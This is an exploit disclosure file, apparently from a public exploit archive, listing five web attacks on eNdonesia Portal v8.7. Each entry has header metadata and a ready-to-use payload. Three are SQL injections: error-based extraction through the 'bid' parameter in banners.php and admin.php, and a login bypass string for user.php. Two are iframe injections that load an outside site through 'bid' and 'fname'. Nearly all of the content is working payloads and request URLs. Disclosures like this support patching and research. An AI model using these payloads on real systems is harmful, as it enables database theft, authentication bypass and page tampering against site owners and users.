@@ -1,0 +1,122 @@
+===========================================================================================
+# Exploit Title: eNdonesia Portal 'banners.php' SQL Inj.
+# Dork: N/A
+# Date: 19-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/
+# Version: v8.7
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: eNdonesia ia a portal software, content management system (CMS) site management system , online publishing system, or whatever you want to name it. For internet, intranet, or on your own PC.
+===========================================================================================
+# POC - SQLi
+# Parameters : bid, banners.php
+# Attack Pattern :
+-1+or+1%3d1+and+(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)
+# GET Method : http://localhost/endonesia87/banners.php?op=click&bid=-1 or
+1=1 and (SELECT 1 and ROW(1,1)>(SELECT
+COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x
+FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: eNdonesia Portal 'user.php' SQL Inj.
+# Dork: N/A
+# Date: 19-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/
+# Version: v8.7
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: eNdonesia ia a portal software, content management
+system (CMS)
+  site management system , online publishing system, or whatever you want
+to name it.
+  For internet, intranet, or on your own PC.
+===========================================================================================
+# POC - SQLi
+# Parameters : email, user.php
+# Attack Pattern : 1'+OR+1=1+OR+'cw'='cw
+# POST Method : http://localhost/endonesia87/user.php
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: eNdonesia Portal 'admin.php' SQL Inj.
+# Dork: N/A
+# Date: 19-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/
+# Version: v8.7
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: eNdonesia ia a portal software, content management
+system (CMS)
+  site management system , online publishing system, or whatever you want
+to name it.
+  For internet, intranet, or on your own PC.
+===========================================================================================
+# POC - SQLi
+# Parameters : bid, admin.php
+# Attack Pattern :
+-1+or+1%3d1+and+(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)
+# GET Method : http://localhost/endonesia87/admin.php?op=BannerDelete&bid=-1
+or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT
+COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x
+FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)&ok=3
+===========================================================================================
+
+===========================================================================================
+# Exploit Title: eNdonesia Portal 'bid' Frame Inj.
+# Dork: N/A
+# Date: 19-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/
+# Version: v8.7
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: eNdonesia ia a portal software, content management
+system (CMS)
+site management system , online publishing system, or whatever you want
+to name it.
+For internet, intranet, or on your own PC.
+===========================================================================================
+# POC - Frame Inj.
+# Parameters : bid, admin.php
+# Attack Pattern :
+%3ciframe+src%3d%22http%3a%2f%2fCyber-Warrior.org%2f%3f%22%3e%3c%2fiframe%3e
+# GET Method : http://localhost/endonesia87/admin.php?op=BannerDelete&bid=<iframe
+src="http://Cyber-Warrior.org/?"></iframe>&ok=3
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: eNdonesia Portal 'fname' Frame Inj.
+# Dork: N/A
+# Date: 19-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://www.endonesia.org/
+# Software Link: https://sourceforge.net/projects/endonesia/
+# Version: v8.7
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: eNdonesia ia a portal software, content management
+system (CMS)
+site management system , online publishing system, or whatever you want
+to name it.
+For internet, intranet, or on your own PC.
+===========================================================================================
+# POC - Frame Inj.
+# Parameters : fname, admin.php, comments
+# Attack Pattern :
+%3ciframe+src%3d%22http%3a%2f%2fCyber-Warrior.org%2f%3f%22%3e%3c%2fiframe%3e
+# POST Method : http://localhost/endonesia87/friend.php
+===========================================================================================
+###########################################################################################
